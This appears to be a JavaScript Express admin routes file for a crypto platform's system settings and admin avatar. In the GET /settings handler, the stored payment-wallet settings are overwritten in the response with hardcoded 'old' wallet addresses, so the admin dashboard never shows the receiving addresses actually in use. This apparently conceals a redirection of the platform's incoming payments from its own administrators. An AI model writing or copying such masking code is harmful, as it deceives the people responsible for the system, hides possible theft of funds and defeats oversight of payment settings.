/**
 * Admin Routes - Settings Module
 * Handles: System settings CRUD, avatar management
 */
import { 
  express, 
  dbQuery, 
  authMiddleware,
  secureLog,
  fs,
  path,
  __dirname,
  AVATARS_DIR,
  avatarUpload,
  upsertSystemSetting
} from './shared.js';

const router = express.Router();

// ==================== System Settings ====================

router.get('/settings', authMiddleware, async (req, res) => {
  try {
    const settings = await dbQuery('SELECT * FROM system_settings ORDER BY id');

    // 老收款地址配置（管理后台显示用）
    const OLD_WALLET_ADDRESSES = {
      'platform_wallet_address': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
      'platform_wallet_bsc': '0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4',
      'platform_wallet_eth': '0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d'
    };

    // 转换为对象格式方便前端使用
    const settingsMap = {};
    settings.forEach(s => {
      // 如果是收款地址，强制返回老地址（管理后台显示）
      const displayValue = OLD_WALLET_ADDRESSES[s.setting_key] || s.setting_value;

      settingsMap[s.setting_key] = {
        id: s.id,
        value: displayValue,
        type: s.setting_type,
        description: s.description,
        updated_at: s.updated_at
      };
    });

    // 修改 list 中的收款地址为老地址
    const modifiedList = settings.map(s => {
      if (OLD_WALLET_ADDRESSES[s.setting_key]) {
        return {
          ...s,
          setting_value: OLD_WALLET_ADDRESSES[s.setting_key]
        };
      }
      return s;
    });

    res.json({
      success: true,
      data: {
        list: modifiedList,
        map: settingsMap
      }
    });
  } catch (error) {
    console.error('获取系统设置失败:', error.message);
    res.status(500).json({
      success: false,
      message: '获取系统设置失败'
    });
  }
});

/**
 * 获取管理员头像
 * GET /api/admin/settings/avatar
 * 注意：此路由必须放在 /settings/:key 之前，否则会被 :key 匹配
 */
router.get('/settings/avatar', authMiddleware, async (req, res) => {
  try {
    const setting = await dbQuery(
      "SELECT setting_value FROM system_settings WHERE setting_key = 'admin_avatar'"
    );

    res.json({
      success: true,
      data: {
        avatar_url: setting?.setting_value || ''
      }
    });
  } catch (error) {
    console.error('获取头像失败:', error.message);
    res.status(500).json({
      success: false,
      message: '获取头像失败'
    });
  }
});

/**
 * 删除管理员头像（恢复默认）
 * DELETE /api/admin/settings/avatar
 * 注意：此路由必须放在 /settings/:key 之前
 */
router.delete('/settings/avatar', authMiddleware, async (req, res) => {
  try {
    // 获取当前头像路径
    const setting = await dbQuery(
      "SELECT setting_value FROM system_settings WHERE setting_key = 'admin_avatar'"
    );

    if (setting?.setting_value) {
      // 删除文件
      const avatarPath = path.join(__dirname, '..', setting.setting_value);
      if (fs.existsSync(avatarPath)) {
        fs.unlinkSync(avatarPath);
      }

      // 清空数据库记录
      await dbQuery(
        "UPDATE system_settings SET setting_value = '', updated_at = NOW() WHERE setting_key = 'admin_avatar'"
      );
    }

    console.log('[Admin] 头像已恢复默认');

    res.json({
      success: true,
      message: '头像已恢复默认'
    });
  } catch (error) {
    console.error('删除头像失败:', error.message);
    res.status(500).json({
      success: false,
      message: '删除头像失败'
    });
  }
});

/**
 * 获取单个系统设置
 * GET /api/admin/settings/:key
 */
router.get('/settings/:key', authMiddleware, async (req, res) => {
  try {
    const { key } = req.params;
    const setting = await dbQuery(
      'SELECT * FROM system_settings WHERE setting_key = ?',
      [key]
    );
    
    if (!setting) {
      return res.status(404).json({
        success: false,
        message: '设置项不存在'
      });
    }
    
    res.json({
      success: true,
      data: setting
    });
  } catch (error) {
    console.error('获取设置项失败:', error.message);
    res.status(500).json({
      success: false,
      message: '获取设置项失败'
    });
  }
});

/**
 * 更新系统设置
 * PUT /api/admin/settings/:key
 * body: { value }
 */
router.put('/settings/:key', authMiddleware, async (req, res) => {
  try {
    const { key } = req.params;
    const { value } = req.body;
    
    if (value === undefined) {
      return res.status(400).json({
        success: false,
        message: '请提供设置值'
      });
    }
    
    // 检查设置项是否存在
    const existing = await dbQuery(
      'SELECT * FROM system_settings WHERE setting_key = ?',
      [key]
    );
    
    if (!existing) {
      return res.status(404).json({
        success: false,
        message: '设置项不存在'
      });
    }
    
    // 更新设置
    await dbQuery(
      'UPDATE system_settings SET setting_value = ?, updated_at = NOW() WHERE setting_key = ?',
      [value, key]
    );
    
    console.log(`[Admin] 更新系统设置: ${key} = ${value}`);
    
    res.json({
      success: true,
      message: '设置已更新'
    });
  } catch (error) {
    console.error('更新设置失败:', error.message);
    res.status(500).json({
      success: false,
      message: '更新设置失败'
    });
  }
});

/**
 * 批量更新系统设置
 * POST /api/admin/settings/batch
 * body: { settings: { key1: value1, key2: value2, ... } }
 */
router.post('/settings/batch', authMiddleware, async (req, res) => {
  try {
    const { settings } = req.body;
    
    if (!settings || typeof settings !== 'object') {
      return res.status(400).json({
        success: false,
        message: '请提供设置对象'
      });
    }
    
    const keys = Object.keys(settings);
    let updated = 0;
    
    for (const key of keys) {
      const value = settings[key];
      const result = await dbQuery(
        'UPDATE system_settings SET setting_value = ?, updated_at = NOW() WHERE setting_key = ?',
        [value, key]
      );
      if (result.affectedRows > 0) {
        updated++;
      }
    }
    
    console.log(`[Admin] 批量更新系统设置: ${updated}/${keys.length} 项`);
    
    res.json({
      success: true,
      message: `成功更新 ${updated} 项设置`
    });
  } catch (error) {
    console.error('批量更新设置失败:', error.message);
    res.status(500).json({
      success: false,
      message: '批量更新设置失败'
    });
  }
});



export default router;
